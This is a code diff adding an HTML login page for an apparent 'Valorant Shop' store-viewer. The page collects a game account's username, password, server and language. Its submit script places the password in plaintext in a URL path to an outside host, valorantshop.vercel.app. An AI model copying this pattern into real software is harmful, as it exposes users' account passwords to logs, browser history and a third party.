@@ -3,9 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Valorant Shop Login</title>
+    <link href="https://fonts.cdnfonts.com/css/valorant" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #141414;
+            color: #ece8e1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        #title {
+            color: #ff4655;
+            text-align: center;
+            margin: 0 0 30px 0;
+            font-size: 2.5em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-family: 'VALORANT', sans-serif;
+            font-weight: normal;
+        }
+        .form-container {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 500px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ece8e1;
+            font-size: 1.1em;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background-color: #2b2b2b;
+            border: none;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #ece8e1;
+            font-size: 1em;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #ff4655;
+            color: #ece8e1;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1.2em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #ff5c69;
+        }
+    </style>
 </head>
 <body>
-    /store/아이디/암호/지역/언어
+    <p id="title">Valorant Shop</p>
+    <div class="form-container">
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="server">Server:</label>
+                <select id="server" name="server">
+                    <option value="kr">Korea</option>
+                    <option value="na">North America</option>
+                    <option value="eu">Europe</option>
+                    <option value="ap">Asia Pacific</option>
+                    <option value="pbe">PBE</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="language">Language:</label>
+                <select id="language" name="language">
+                    <option value="en-US">English</option>
+                    <option value="es-MX">Español (Latinoamérica)</option>
+                    <option value="es-ES">Español (España)</option>
+                    <option value="pt-BR">Português (Brasil)</option>
+                    <option value="pl-PL">Polski</option>
+                    <option value="de-DE">Deutsch</option>
+                    <option value="it-IT">Italiano</option>
+                    <option value="zh-CN">中文 (简体)</option>
+                    <option value="zh-TW">中文 (繁體)</option>
+                    <option value="ja-JP">日本語</option>
+                    <option value="ko-KR">한국어</option>
+                    <option value="ru-RU">Русский</option>
+                    <option value="tr-TR">Türkçe</option>
+                    <option value="th-TH">ไทย</option>
+                    <option value="vi-VN">Tiếng Việt</option>
+                </select>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = encodeURIComponent(document.getElementById('username').value);
+            const password = encodeURIComponent(document.getElementById('password').value);
+            const server = document.getElementById('server').value;
+            const language = document.getElementById('language').value;
+            const url = `https://valorantshop.vercel.app/store/${username}/${password}/${server}/${language}`;
+            window.location.href = url;
+        });
+    </script>
 </body>
 </html>
